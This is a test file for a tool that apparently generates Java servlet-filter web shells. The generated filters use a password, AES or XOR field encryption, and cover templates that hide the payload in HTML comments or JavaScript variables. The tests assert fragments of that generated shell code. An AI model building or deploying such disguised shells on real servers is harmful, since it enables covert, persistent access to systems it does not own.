import { describe, expect, it } from "vitest";

import { LEGACY_CIPHER, type MimicCipher } from "../connect/mimic-codecs.js";
import { javaStringLiteral, renderCryptoProbe, renderFilterJava } from "./java-template.js";

const base = {
  className: "MimicFilterT1",
  pass: "p@ss",
  secret: "kéy",
  fields: ["verCode", "X-Token"],
  bodyContentTypes: ["json"],
  templates: [{ template: '<html><body>登录"页"\n©</body></html>', contentType: "text/html;charset=UTF-8" }],
  wrapper: { bodyB64: "V1JBUFBFUg==", streamB64: "U1RSRUFN" },
};

describe("javaStringLiteral", () => {
  it("escapes quotes, backslashes, newlines and non-ASCII", () => {
    expect(javaStringLiteral('a"b\\c\ndé')).toBe('a\\"b\\\\c\\nd\\u00e9');
    expect(javaStringLiteral("plain-ASCII_123")).toBe("plain-ASCII_123");
  });
});

describe("renderFilterJava", () => {
  it("renders the legacy filter with ecb/base64/js-var snippets", () => {
    const src = renderFilterJava({ ...base, cipher: LEGACY_CIPHER });
    expect(src).toContain("public class MimicFilterT1 implements Filter");
    expect(src).toContain('FIELDS = { "verCode", "X-Token" }');
    expect(src).toContain('PASS = "p@ss"');
    expect(src).toContain('SECRET = "k\\u00e9y"');
    expect(src).toContain("AES/ECB/PKCS5Padding");
    expect(src).toContain("Base64.getEncoder()");
    expect(src).not.toContain("AES/CBC");
    expect(src).not.toContain("appendPad");
    expect(src).toContain('"<script>var Re" + md5Hex(passKey).substring(0, 5) + "_config=\\"" + payload + "\\";</script>"');
  });

  it("renders cbc/hex/padTail/html-comment selections", () => {
    const cipher: MimicCipher = {
      algorithm: "aes-cbc",
      encoding: "hex",
      padTail: true,
      marker: "html-comment",
    };
    const src = renderFilterJava({ ...base, cipher });
    expect(src).toContain("AES/CBC/PKCS5Padding");
    expect(src).toContain("IvParameterSpec");
    expect(src).toContain("appendPad(s, aesKey)");
    expect(src).toContain("stripPad(v, aesKey)");
    expect(src).toContain('return "<!--Re" + md5Hex(passKey).substring(0, 5) + "_config:" + payload + "-->";');
    expect(src).toContain('sb.append(String.format("%02x", b & 0xff))');
    expect(src).not.toContain("AES/ECB");
  });

  it("renders xor/base64url selections", () => {
    const cipher: MimicCipher = { ...LEGACY_CIPHER, algorithm: "xor", encoding: "base64url" };
    const src = renderFilterJava({ ...base, cipher });
    expect(src).toContain("out[i] = (byte) (data[i] ^ k[i % k.length]);");
    expect(src).toContain("Base64.getUrlEncoder().withoutPadding()");
    expect(src).not.toContain("Cipher.getInstance");
  });

  it("escapes cover templates into single-line Java literals", () => {
    const src = renderFilterJava({ ...base, cipher: LEGACY_CIPHER });
    // quotes -> \" — newline -> \n — every non-ASCII char -> \uXXXX
    expect(src).toContain('\\u767b\\u5f55\\"\\u9875\\"\\n\\u00a9');
    // and the literal stays on one source line
    const tplLine = src.split("\n").find((l) => l.includes("\\u767b"))!;
    expect(tplLine.trim().startsWith('"')).toBe(true);
    expect(tplLine.trim().endsWith('"')).toBe(true);
  });

  it("renders per-template content types and the placeholder + JSON-body plumbing", () => {
    const src = renderFilterJava({
      ...base,
      templates: [
        { template: '<html><body>a</body></html>', contentType: "text/html" },
        { template: '{"code":0,"data":"{{payload}}"}', contentType: "application/json" },
      ],
      cipher: LEGACY_CIPHER,
    });
    expect(src).toContain('CTS = { "text/html", "application/json" }');
    expect(src).toContain('page = tpl.replace("{{payload}}", payload);');
    expect(src).toContain("static String jsonField(String body, String field)");
    expect(src).toContain("static String multipartField(String body, String field)");
    expect(src).toContain("static String xmlField(String body, String field)");
    expect(src).toContain('WRAPPER_B64 = "V1JBUFBFUg=="');
    expect(src).toContain("wrapBody(httpReq, bodyBytes)");
    // bodies are read only for the profile's own Content-Types (allowlist —
    // reading anything else would consume a body the shell doesn't own)
    expect(src).toContain('BODY_CTS = { "json" }');
    expect(src).toContain("ctMatches(ct)");
    expect(src).toContain("multipartField(bodyText, f)");
    expect(src).toContain("xmlField(bodyText, f)");
    // SSE skins stream chunk by chunk
    expect(src).toContain('tplCt.contains("event-stream")');
    expect(src).toContain("response.flushBuffer()");
    expect(src).toContain("response.setContentType(tplCt);");
    // the wrapper must NOT be a compile-time inner class (single-class upload)
    expect(src).not.toContain("static class CachedBody");
  });
});

describe("renderCryptoProbe", () => {
  it("shares every codec snippet with the filter", () => {
    const cipher: MimicCipher = { algorithm: "xor", encoding: "base64url", padTail: true, marker: "js-var" };
    const filter = renderFilterJava({ ...base, cipher });
    const probe = renderCryptoProbe(cipher);
    for (const fragment of [
      "static byte[] crypt(",
      "static String enc(",
      "static byte[] dec(",
      "static String encryptField(",
      "static byte[] decryptField(",
      "appendPad",
      "stripPad",
    ]) {
      expect(filter).toContain(fragment);
      expect(probe).toContain(fragment);
    }
    expect(probe).toContain("public static void main(String[] args)");
  });
});
